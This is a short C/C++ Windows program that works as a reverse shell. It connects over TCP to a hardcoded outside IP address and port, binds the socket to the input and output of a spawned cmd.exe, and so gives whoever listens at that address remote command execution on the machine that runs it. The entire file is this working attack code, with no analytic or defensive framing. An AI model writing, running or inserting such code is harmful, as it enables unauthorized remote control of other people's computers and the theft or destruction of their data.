#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

int main() {
	SOCKET shell;
	sockaddr_in shell_addr;
	WSADATA wsa;
	int connection;
	char ip_addr[] = "198.58.127.74";
	int port = 8448;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	char RecvServer[512];
	
	WSAStartup(MAKEWORD(2,2), &wsa); //Initialize Winsock
	shell = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL); //create TCP socket
	
	shell_addr.sin_port = htons(port);
	shell_addr.sin_family = AF_INET;
	shell_addr.sin_addr.s_addr = inet_addr(ip_addr);
	

    // Connect to the target server
    connection = WSAConnect(shell, (SOCKADDR*)&shell_addr, sizeof(shell_addr), NULL, NULL, NULL, NULL);
    if (connection == SOCKET_ERROR) {
        printf("Error: connection to the target server failed. Error Code: %d\n", WSAGetLastError());
        closesocket(shell);
        WSACleanup();
        return 1;
    }
	
	recv(shell, RecvServer, sizeof(RecvServer), 0);
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
	si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE) shell; // Pipe std input/output/err to the stocket
	CreateProcess(NULL, const_cast<LPSTR>("cmd.exe"), NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi); //Spawn command prompt
	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
	memset(RecvServer, 0, sizeof(RecvServer));
	
	//closesocket(shell);
	return 0;	
}